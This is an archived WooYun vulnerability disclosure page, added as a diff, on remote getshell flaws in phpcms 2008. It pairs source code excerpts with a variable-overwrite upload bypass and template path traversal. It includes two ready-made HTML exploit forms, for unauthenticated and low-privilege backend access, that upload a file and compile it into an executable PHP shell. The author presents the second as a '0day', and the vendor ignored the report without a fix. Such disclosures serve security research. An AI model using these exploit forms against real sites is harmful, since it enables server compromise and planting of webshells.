@@ -1,0 +1,278 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		phpcms前台和(后台低权限)getshell  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		phpcms前台和(后台低权限)getshell  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/西毒">西毒</a> 
+</li><li>提交时间：		2013-11-21 09:37</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-11-21：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-11-26：	厂商主动忽略漏洞，细节向第三方安全合作伙伴开放<br/>
+									2014-02-16：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail"></p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1、首先先说前台的吧，估计很多站都开始补了。是针对phpcms 2008的，二次攻击范畴，二次解析getshell。 不过目前其他人已经知道了，我解析下<br />
+<br />
+原理如下<br />
+<br />
+</p><p class="detail"><a href="../images/21092314395b4ce92a867cb0dde59f5a081c6f83.jpg" target="_blank"><img src="../images/21092314395b4ce92a867cb0dde59f5a081c6f83.jpg" alt="1ZNQXH0MW3RRCH2@84IJKTO.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+在upload_field.php中<br />
+<br />
+</p><pre><code>$upload_allowext = !empty($C[&#039;upload_allowext&#039;]) ? $C[&#039;upload_allowext&#039;] : $info[&#039;upload_allowext&#039;];<br />
+    // 漏洞触发点   通过变量覆盖$upload_allowext此变量赋值为html<br />
+$upload_maxsize = !empty($C[&#039;upload_maxsize&#039;]) ? $C[&#039;upload_maxsize&#039;] : $info[&#039;upload_maxsize&#039;]*1024;<br />
+$isthumb = isset($C[&#039;thumb_enable&#039;]) ? $C[&#039;thumb_enable&#039;] : ($PHPCMS[&#039;thumb_enable&#039;] &amp;&amp; $info[&#039;isthumb&#039;] ? 1 : 0);<br />
+$iswatermark = isset($C[&#039;watermark_enable&#039;]) ? $C[&#039;watermark_enable&#039;] : ($PHPCMS[&#039;watermark_enable&#039;] &amp;&amp; $info[&#039;iswatermark&#039;] ? 1 : 0);<br />
+$thumb_width = isset($width) ? $width : (isset($C[&#039;thumb_width&#039;]) ? $C[&#039;thumb_width&#039;] : ($info[&#039;thumb_width&#039;] ? $info[&#039;thumb_width&#039;] : $PHPCMS[&#039;thumb_width&#039;]));<br />
+$thumb_height = isset($height) ? $height : (isset($C[&#039;thumb_height&#039;]) ? $C[&#039;thumb_height&#039;] : ($info[&#039;thumb_height&#039;] ? $info[&#039;thumb_height&#039;] : $PHPCMS[&#039;thumb_height&#039;]));<br />
+$watermark_img = PHPCMS_ROOT.($info[&#039;watermark_img&#039;] ? $info[&#039;watermark_img&#039;] : $PHPCMS[&#039;watermark_img&#039;]);<br />
+<br />
+$attachment = new attachment($mod);  //实例化attachment上传类<br />
+<br />
+if($dosubmit)<br />
+{<br />
+	$attachment-&gt;upload($uploadtext, $upload_allowext, $upload_maxsize, 1);<br />
+          // 漏洞触发点  引用attachment上传类</code></pre><p class='detail'><br />
+<br />
+这里我们可以通过?C[upload_allowext]=html&amp;C[upload_maxsize]=1024000这样的方式来覆盖上传类型，达到上传我们的利用恶意脚本，但是不能直接上传php之类的，你可以跟踪一下这个attachment类文件。但是我们可以通过上传html<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+在preview.php中60行处<br />
+<br />
+</p><pre><code>$head[&#039;description&#039;] = $r[&#039;description&#039;];<br />
+if(!$template) $template = $C[‘template_show’];  // 通过变量覆盖即可覆盖$template变量<br />
+include template(‘phpcms’, $template);  // 调用template 模板解析函数<br />
+<br />
+<br />
+// 解析模板方法<br />
+function template($module = &#039;phpcms&#039;, $template = &#039;index&#039;, $istag = 0)<br />
+{<br />
+	$compiledtplfile = TPL_CACHEPATH.$module.&#039;_&#039;.$template.&#039;.tpl.php&#039;;<br />
+	if(TPL_REFRESH &amp;&amp; (!file_exists($compiledtplfile) || @filemtime(TPL_ROOT.TPL_NAME.&#039;/&#039;.$module.&#039;/&#039;.$template.&#039;.html&#039;) &gt; @filemtime($compiledtplfile) || @filemtime(TPL_ROOT.TPL_NAME.&#039;/tag.inc.php&#039;) &gt; @filemtime($compiledtplfile)))<br />
+	{<br />
+		require_once PHPCMS_ROOT.&#039;include/template.func.php&#039;;<br />
+		template_compile($module, $template, $istag);  // 模板解析<br />
+	}<br />
+	return $compiledtplfile;<br />
+}<br />
+              //  继续跟踪template_compile函数</code></pre><p class='detail'><br />
+<br />
+</p><pre><code>在template.func.php中2行处<br />
+<br />
+function template_compile($module, $template, $istag = 0)<br />
+{<br />
+	$tplfile = TPL_ROOT.TPL_NAME.‘/’.$module.‘/’.$template.‘.html’;  // 这里$template可控<br />
+	$content = @file_get_contents($tplfile);    // 触发漏洞，解析构造好的恶意文件<br />
+	if($content === false) showmessage(&quot;$tplfile is not exists!&quot;);<br />
+	$compiledtplfile = TPL_CACHEPATH.$module.&#039;_&#039;.$template.&#039;.tpl.php&#039;;<br />
+	$content = ($istag || substr($template, 0, 4) == &#039;tag_&#039;) ? &#039;&lt;?php function _tag_&#039;.$module.&#039;_&#039;.$template.&#039;($data, $number, $rows, $count, $page, $pages, $setting){ global $PHPCMS,$MODULE,$M,$CATEGORY,$TYPE,$AREA,$GROUP,$MODEL,$templateid,$_userid,$_username;@extract($setting);?&gt;&#039;.template_parse($content, 1).&#039;&lt;?php } ?&gt;&#039; : template_parse($content);<br />
+	$strlen = file_put_contents($compiledtplfile, $content);<br />
+	@chmod($compiledtplfile, 0777);<br />
+	return $strlen;<br />
+}</code></pre><p class='detail'><br />
+<br />
+这是解析的地方<br />
+<br />
+最终给出exp如下<br />
+<br />
+</p><pre><code>&lt;form action=&quot;http://xxx.com/upload_field.php?C[upload_allowext]=html&amp;C[upload_maxsize]=1024000&amp;uinfo=1&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;!--  修改网址--&gt;<br />
+	    &lt;input type=&quot;file&quot; name=&quot;1&quot;&gt;<br />
+        &lt;input type=&quot;hidden&quot; value=&quot;1&quot; name=&quot;uploadtext&quot;&gt;<br />
+		&lt;input type=&quot;hidden&quot; value=&quot;&quot; name=&quot;catid&quot;&gt;<br />
+        &lt;input type=&quot;hidden&quot; value=&quot;&quot; name=&quot;rename&quot;&gt;<br />
+		&lt;input type=&quot;hidden&quot; value=&quot;&quot; name=&quot;oldname&quot;&gt;<br />
+        &lt;input type=&quot;hidden&quot; value=&quot;1&quot; name=&quot;modelid&quot;&gt;<br />
+		&lt;input type=&quot;hidden&quot; value=&quot;1&quot; name=&quot;fieldid&quot;&gt;<br />
+		&lt;input type=&quot;hidden&quot; value=&quot;300&quot; name=&quot;width&quot;&gt;<br />
+		&lt;input type=&quot;hidden&quot; value=&quot;300&quot; name=&quot;height&quot;&gt;<br />
+        &lt;input type=&quot;hidden&quot; value=&quot;100000&quot; name=&quot;MAX_FILE_SIZE&quot;&gt;<br />
+        &lt;input type=&quot;submit&quot; name=&quot;dosubmit&quot; value=&quot;上传&quot; style=&quot;margin-top:5px; height:28px;&quot;&gt;<br />
+    &lt;/form&gt;<br />
+   &lt;hr style=&quot;width:600px; float:left;&quot;&gt;&lt;br/&gt;<br />
+	第二步:<br />
+    &lt;form action=&quot;http://xxx.com/preview.php&quot; method=&quot;get&quot;&gt;<br />
+	    &lt;input type=&quot;hidden&quot; value=&quot;2&quot; name=&quot;info[id]&quot;&gt;<br />
+		&lt;input type=&quot;hidden&quot; value=&quot;./../../../uploadfile/2013/0909/1&quot; name=&quot;template&quot;&gt;<br />
+        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;getshell&quot;&gt;<br />
+    &lt;/form&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+2、后台低权限 getshell<br />
+<br />
+很多人拿到phpcms 2008的后台苦于拿不到shell。。。苦苦琢磨琢磨啊<br />
+<br />
+顾贡献一枚0day，只要后台能发个帖，你就能拿shell<br />
+<br />
+他这个原理是一样的，后台上传图片的时候同样可以覆盖变量，达到getshell<br />
+<br />
+原理一样，给出个exp演示<br />
+<br />
+</p><pre><code>&lt;form action=&quot;http://www.xxx.cn/admin.php?mod=phpcms&amp;file=upload_field&amp;C[upload_allowext]=html&amp;C[upload_maxsize]=1024000&amp;uinfo=1&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;!--  修改网址--&gt;<br />
+	    &lt;input type=&quot;file&quot; name=&quot;1&quot;&gt;<br />
+        &lt;input type=&quot;hidden&quot; value=&quot;1&quot; name=&quot;uploadtext&quot;&gt;<br />
+		&lt;input type=&quot;hidden&quot; value=&quot;&quot; name=&quot;catid&quot;&gt;<br />
+        &lt;input type=&quot;hidden&quot; value=&quot;&quot; name=&quot;rename&quot;&gt;<br />
+		&lt;input type=&quot;hidden&quot; value=&quot;&quot; name=&quot;oldname&quot;&gt;</code></pre><p class='detail'><br />
+<br />
+你只要改成admin.php就可以了<br />
+<br />
+同样getshell，随意生成webshell<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">看详细说明吧 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">这个这个.....好像官方现在开始只关注v9了，一帮2008的哭死 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/西毒" title="西毒">西毒</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-043563" title="phpcms前台和(后台低权限)getshell">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：无影响厂商忽略</p>
+													<p class="detail">忽略时间：2013-11-26 09:38</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"></p>
+											
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="43563";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
